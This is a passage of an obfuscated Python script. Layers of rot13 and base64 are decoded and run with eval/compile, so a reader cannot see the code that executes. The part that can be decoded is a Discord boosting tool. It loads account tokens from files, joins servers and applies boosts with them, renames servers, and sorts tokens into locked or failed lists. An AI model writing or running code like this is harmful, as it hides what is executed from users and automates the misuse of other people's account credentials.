EOiB7dG9rZW59IiwgRmFsc2UpDQogICAgICAgICAgICB2YXJpYWJsZXMuZmFpbGVkX3Rva2Vucy5hcHBlbmQodG9rZW4pDQogICAgICAgICAgICByZW1vdmUodG9rZW4sIGZpbGVuYW1lKQ0KICAgICAgICAgICAgDQogICAgICAgIGlmICJZb3UgbmVlZCB0byB2ZXJpZnkgeW91ciBhY2NvdW50IGluIG9yZGVyIHRvIHBlcmZvcm0gdGhpcyBhY3Rpb24uIiBpbiBib29zdF9kYXRhLnRleHQ6DQogICAgICAgICAgICBzcHJpbnQoZiJbe3RocmVhZH1dIExPQ0tFRDoge3Rva2VufSIsIEZhbHNlKQ0KICAgICAgICAgICAgdmFyaWFibGVzLmZhaWxlZF90b2tlbnMuYXBwZW5kKHRva2VuKQ0KICAgICAgICAgICAgcmVtb3ZlKHRva2VuLCBmaWxlbmFtZSkNCiAgICAgICAgICAgIA0KICAgICAgICBpZiBib29zdF9kYXRhLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICAgICAgICAgIGlmIGxlbihib29zdF9kYXRhLmpzb24oKSkgIT0gMDoNCiAgICAgICAgICAgICAgICBqb2luX291dGNvbWUsIGd1aWxkX2lkID0gam9pbl9zZXJ2ZXIoc2Vzc2lvbiwgaGVhZGVycywgdXNlcmFnZW50LCBpbnZpdGUsIHRva2VuLCB0aHJlYWQpDQogICAgICAgICAgICAgICAgaWYgam9pbl9vdXRjb21lOg0KICAgICAgICAgICAgICAgICAgICBzcHJpbnQoZiJbe3RocmVhZH1dIEpPSU5FRDoge3Rva2VufSIsIFRydWUpDQogICAgICAgICAgICAgICAgICAgIGZvciBib29zdCBpbiBib29zdF9kYXRhLmpzb24oKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGJvb3N0X2lkID0gYm9vc3RbImlkIl0NCiAgICAgICAgICAgICAgICAgICAgICAgIGJvb3N0ZWQgPSBwdXRfYm9vc3Qoc2Vzc2lvbiwgaGVhZGVycywgZ3VpbGRfaWQsIGJvb3N0X2lkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgYm9vc3RlZDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzcHJpbnQoZiJbe3RocmVhZH1dIEJPT1NURUQ6IHt0b2tlbn0iLCBUcnVlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhcmlhYmxlcy5ib29zdHNfZG9uZSArPSAxDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9rZW4gbm90IGluIHZhcmlhYmxlcy5zdWNjZXNzX3Rva2VuczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyaWFibGVzLnN1Y2Nlc3NfdG9rZW5zLmFwcGVuZCh0b2tlbikgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNwcmludChmIlt7dGhyZWFkfV0gRVJST1IgQk9PU1RJTkc6IHt0b2tlbn0iLCBGYWxzZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b2tlbiBub3QgaW4gdmFyaWFibGVzLmZhaWxlZF90b2tlbnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oImVycm9yX2Jvb3N0aW5nLnR4dCIsICJhIikud3JpdGUoZiJcbnt0b2tlbn0iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXJpYWJsZXMuZmFpbGVkX3Rva2Vucy5hcHBlbmQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgIHJlbW92ZSh0b2tlbiwgZmlsZW5hbWUpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgY29uZmlnWyJjaGFuZ2Vfc2VydmVyX25pY2siXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSBjaGFuZ2VfZ3VpbGRfbmFtZShzZXNzaW9uLCBoZWFkZXJzLCBndWlsZF9pZCwgbmljaykNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoYW5nZWQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3ByaW50KGYiW3t0aHJlYWR9XSBSRU5BTUVEOiB7dG9rZW59IiwgVHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3ByaW50KGYiW3t0aHJlYWR9XSBFUlJPUiBSRU5BTUlORzoge3Rva2VufSIsIEZhbHNlKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIHNwcmludChmIlt7dGhyZWFkfV0gRVJST1IgSk9JTklORzoge3Rva2VufSIsIEZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCJlcnJvcl9qb2luaW5nLnR4dCIsICJhIikud3JpdGUoZiJcbnt0b2tlbn0iKQ0KICAgICAgICAgICAgICAgICAgICByZW1vdmUodG9rZW4sIGZpbGVuYW1lKQ0KICAgICAgICAgICAgICAgICAgICB2YXJpYWJsZXMuZmFpbGVkX3Rva2Vucy5hcHBlbmQodG9rZW4pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHJlbW92ZSh0b2tlbiwgZmlsZW5hbWUpDQogICAgICAgICAgICAgICAgc3ByaW50KGYiW3t0aHJlYWR9XSBOTyBOSVRSTzoge3Rva2VufSIsIEZhbHNlKQ0KICAgICAgICAgICAgICAgIHZhcmlhYmxlcy5mYWlsZWRfdG9rZW5zLmFwcGVuZCh0b2tlbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICNzcHJpbnQoZiJbe3RocmVhZH1dIHtzdHIoZSkuY2FwaXRhbGl6ZSgpfSB8IEZ1bmN0aW9uOiBCb29zdF9TZXJ2ZXIsIFJldHJ5aW5nIiwgRmFsc2UpDQogICAgICAgIGJvb3N0X3NlcnZlcihpbnZpdGUsIG1vbnRocywgdG9rZW4sIHRocmVhZCwgbmljaykNCg0KDQpkZWYgdGhyZWFkX2Jvb3N0KGludml0ZSwgYW1vdW50LCBtb250aHMsIG5pY2spOg0KICAgIHZhcmlhYmxlcy5ib29zdHNfZG9uZSA9IDANCiAgICB2YXJpYWJsZXMuc3VjY2Vzc190b2tlbnMgPSBbXQ0KICAgIHZhcmlhYmxlcy5mYWlsZWRfdG9rZW5zID0gW10NCiAgICANCiAgICBpZiBtb250aHMgPT0gMToNCiAgICAgICAgZmlsZW5hbWUgPSAiaW5wdXQvMW1fdG9rZW5zLnR4dCINCiAgICBpZiBtb250aHMgPT0gMzoNCiAgICAgICAgZmlsZW5hbWUgPSAiaW5wdXQvM21fdG9rZW5zLnR4dCINCiAgICANCiAgICBpZiB2YWxpZGF0ZUludml0ZShpbnZpdGUpID09IEZhbHNlOg0KICAgICAgICBzcHJpbnQoZiJUaGUgaW52aXRlIHJlY2VpdmVkIGlzIGludmFsaWQuIiwgRmFsc2UpDQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgICAgICANCiAgICB3aGlsZSB2YXJpYWJsZXMuYm9vc3RzX2RvbmUgIT0gYW1vdW50Og0KICAgICAgICBwcmludCgpDQogICAgICAgIHRva2VucyA9IGdldF9hbGxfdG9rZW5zKGZpbGVuYW1lKQ0KICAgICAgICANCiAgICAgICAgaWYgdmFyaWFibGVzLmJvb3N0c19kb25lICUgMiAhPSAwOg0KICAgICAgICAgICAgdmFyaWFibGVzLmJvb3N0c19kb25lIC09IDENCiAgICAgICAgICAgIA0KICAgICAgICBudW1Ub2tlbnMgPSBpbnQoKGFtb3VudCAtIHZhcmlhYmxlcy5ib29zdHNfZG9uZSkvMikNCiAgICAgICAgaWYgbGVuKHRva2VucykgPT0gMCBvciBsZW4odG9rZW5zKSA8IG51bVRva2VuczoNCiAgICAgICAgICAgIHNwcmludChmIk5vdCBlbm91Z2gge21vbnRoc30gbW9udGggdG9rZW5zIGluIHN0b2NrIHRvIGNvbXBsZXRlIHRoZSByZXF1ZXN0IiwgRmFsc2UpDQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCiAgICAgICAgDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICB0aHJlYWRzID0gW10NCiAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKG51bVRva2Vucyk6DQogICAgICAgICAgICAgICAgdG9rZW4gPSB0b2tlbnNbaV0NCiAgICAgICAgICAgICAgICB0aHJlYWQgPSBpKzENCiAgICAgICAgICAgICAgICB0ID0gdGhy'
destiny = 'MJSxnJ5aYyEbpzIuMPu0LKWaMKD9Lz9ip3Esp2IlqzIlYPOupzqmCFucoaMcqTHfVT1ioaEbpljtqT9eMJ4fVUEbpzIuMPjtozywnlxcQDbtVPNtVPNtVPNtVPNtVPNtqP5xLJIgo24tCFOHpaIyQDbtVPNtVPNtVPNtVPNtVPNtqTulMJSxpl5upUOyozDbqPxAPvNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVTMipvOcVTyhVUWuozqyXT51oIEin2Ihplx6QDbtVPNtVPNtVPNtVPNtVPNtp3OlnJ50XTLvHUWiL2Imp2yhMl4hYv5povVfVSElqJHcQDbtVPNtVPNtVPNtVPNtVPNtqTulMJSxp1gcKF5mqTSlqPtcQDbtVPNtVPNtVPNtVPOjpzyhqPtcQDbtVPNtVPNtVPNtVPNtVPNtQDbtVPNtVPNtVPNtVPOzo3VtnFOcovOlLJ5aMFuhqJ1Ho2gyoaZcBt0XVPNtVPNtVPNtVPNtVPNtVUEbpzIuMUAonI0hnz9covtcQDbAPvNtVPNtVPNtVPNtVN0XVPNtVUWyqUIlovOHpaIyQDbtVPNtQDbAPt0XQDcjpzyhqPuzWlpar1A0rJkyYxWFFHqVIU17Ez9lMF5ADHqSGyEOsD0XVPNtVPNtVPNtVPNtVPNtVPNtQDbtVPNAPt0XQDbAPt0X4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnEQDevycRtVPQvycRtVPQvycUvycUvycRtVPQvycUvycUvycUvycUvycUvycRtVPNtVBXJxrXJxrXJxrXJxrXJxrXJxrXJxrXJxrXJxrXJxrXJxFNt4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnE4cnEVPNtVPNt4cnE4cnE4cnE4cnE4cnE4cnE4cnEVPNtVPQvycUvycUvycUvycUvycUvycRtVPQvycUvycUvycUvycUvycRtVPQvycRtVPNtVPNtVBXJxrXJxrXJxrXJxrXJxrXJxrXJxrXJxrXJxFNtVBXJxrXJxrXJxrXJxFNtVPNtVPNtVN0X4cnFVPNt4cnFVPNt4cnF4cnFVPNt4cnF4cnF4cnF4cnF4cnFVPQvycYvycYvycYvycVtVPQvycYvycYvycYvycYvycYvycYvycYvycVtVBXJxvNt4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnFVPNt4cnF4cnF4cnF4cnFVPNt4cnF4cnF4cnFVPNt4cnF4cnF4cnF4cnFVPNt4cnF4cnF4cnFVPNt4cnF4cnF4cnF4cnF4cnFVPNt4cnFVPNt4cnF4cnF4cnF4cnFVPNt4cnF4cnF4cnF4cnFVPNt4cnF4cnF4cnFVPNt4cnFVPNt4cnF4cnF4cnF4cnF4cnF4cnFQDevycVtVPQvycVtVPQvycVtVPQvycYvycYvycYvycYvycVtVBXJxhXJxhXJxhXJxhXJxhXJxhXJxhXJxhXJxhXJxhXJxhXJxhXJxhXJxhXJxvNt4cnF4cnFVPNt4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnFVPNt4cnF4cnF4cnF4cnF4cnF4cnF4cnFVPNt4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnFVPNt4cnFVPNt4cnF4cnF4cnF4cnF4cnFVPNt4cnFVPNt4cnF4cnF4cnF4cnFVPNt4cnF4cnF4cnFVPNt4cnF4cnF4cnF4cnF4cnF4cnF4cnF4cnFVPNt4cnF4cnF4cnF4cnF4cnF4cnFQDevycZtVPQvycZtVBXJxlNt4cnG4cnG4cnG4cnG4cnG4cnG4cnGVPNt4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnGVPNt4cnG4cnG4cnGVPNt4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnGVPNt4cnG4cnG4cnG4cnG4cnGVPNt4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnGVPNt4cnGVPNt4cnG4cnG4cnG4cnG4cnGVPNt4cnGVPQvycZtVPQvycCvycCvycCvycCvycCvycCvycZtVPQvycCvycCvycCvycCvycCvycCvycCvycZtVPNtVPNt4cnG4cnGQDevycZtVPQvycZtVPQvycCvycZtVPQvycCvycCvycCvycZtVPQvycCvycCvycZtVPNtVPQvycCvycCvycZtVPNtVPNt4cnGVPNt4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnGVPNt4cnG4cnGVPNt4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnGVPNt4cnGVPNt4cnG4cnG4cnG4cnG4cnGVPNt4cnGVPNt4cnG4cnGVPNt4cnG4cnG4cnG4cnG4cnGVPNt4cnG4cnG4cnG4cnG4cnG4cnG4cnG4cnGVPNt4cnG4cnG4cnG4cnG4cnG4cnGQDevycZtVPQvycZtVPQvycCvycCvycZtVPQvycCvycCvycCvycZtVPQvycCvycCvycCvycZtVBXJx+XJx+XJx+XJxlNtVBXJx+XJx+XJx+XJx+XJx+XJx+XJxlNtVBXJx+XJx+XJx+XJx+XJx+XJx+XJx+XJxlNtVBXJx+XJx+XJx+XJxlNtVBXJx+XJx+XJxlNtVBXJx+XJx+XJx+XJx+XJxlNtVBXJx+XJxlNtVBXJx+XJx+XJx+XJx+XJxlNtVBXJxlNtVBXJx+XJx+XJx+XJxlNtVBXJx+XJx+XJx+XJxlNtVBXJx+XJx+XJxlNtVBXJxlNtVBXJx+XJx+XJx+XJx+XJx+XJxj0X4cnVVPNt4cnVVPNt4cnV4cnV4cnV4cnV4cnVVPNt4cnV4cnV4cnVVPNtVPNt4cnV4cnV4cnV4cnV4cnVVPNt4cnV4cnV4cnV4cnV4cnV4cnV4cnV4cnV4cnVVPNt4cnV4cnV4cnV4cnV4cnV4cnV4cnV4cnV4cnVVPNtVPNt4cnV4cnV4cnV4cnV4cnV4cnV4cnVVPNtVPQvybwvybwvybwvybwvybwvybwvybwvybttVPNt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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
